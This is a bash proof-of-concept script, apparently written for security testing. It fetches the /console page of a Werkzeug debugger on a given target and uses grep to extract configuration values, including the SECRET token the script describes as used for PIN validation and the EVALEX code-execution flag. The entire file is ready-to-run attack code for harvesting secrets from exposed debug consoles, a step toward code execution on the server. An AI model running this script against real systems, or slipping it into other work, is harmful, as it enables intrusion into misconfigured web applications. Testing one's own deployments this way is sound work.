#!/bin/bash

# POC: Werkzeug Debugger Sensitive Configuration Exposure
# Demonstrates extraction of sensitive tokens and configuration from /console endpoint

TARGET="${1:-http://localhost:5000}"
CONSOLE_URL="$TARGET/console"

echo "[*] Werkzeug Debugger Sensitive Configuration Exposure POC"
echo "[*] Target: $CONSOLE_URL"
echo ""

# Fetch the console page
echo "[*] Fetching /console endpoint..."
RESPONSE=$(curl -s "$CONSOLE_URL")

if [ -z "$RESPONSE" ]; then
    echo "[-] Failed to fetch console page"
    exit 1
fi

echo "[+] Console page retrieved"
echo ""

# Extract sensitive variables
echo "[*] Extracting sensitive configuration variables..."
echo ""

# Extract EVALEX value
EVALEX=$(echo "$RESPONSE" | grep -oP 'EVALEX\s*=\s*\K[^,;]+' | head -1)
if [ -n "$EVALEX" ]; then
    echo "[+] EVALEX: $EVALEX (Code execution capability)"
fi

# Extract EVALEX_TRUSTED value
EVALEX_TRUSTED=$(echo "$RESPONSE" | grep -oP 'EVALEX_TRUSTED\s*=\s*\K[^,;]+' | head -1)
if [ -n "$EVALEX_TRUSTED" ]; then
    echo "[+] EVALEX_TRUSTED: $EVALEX_TRUSTED (Unlocked status)"
fi

# Extract SECRET token
SECRET=$(echo "$RESPONSE" | grep -oP 'SECRET\s*=\s*"?\K[^",;]+' | head -1)
if [ -n "$SECRET" ]; then
    echo "[+] SECRET token: $SECRET (Used for PIN validation)"
fi

# Extract TRACEBACK value
TRACEBACK=$(echo "$RESPONSE" | grep -oP 'TRACEBACK\s*=\s*\K[^,;]+' | head -1)
if [ -n "$TRACEBACK" ]; then
    echo "[+] TRACEBACK: $TRACEBACK (Traceback ID)"
fi

echo ""
echo "[*] Raw configuration snippet from page source:"
echo "$RESPONSE" | grep -A 3 "var TRACEBACK" | head -4

if [ -n "$SECRET" ]; then
    echo ""
    echo "[+] VULNERABILITY CONFIRMED: Sensitive configuration exposed in page source"
    exit 0
else
    echo ""
    echo "[-] Could not extract SECRET token - vulnerability may not be present"
    exit 1
fi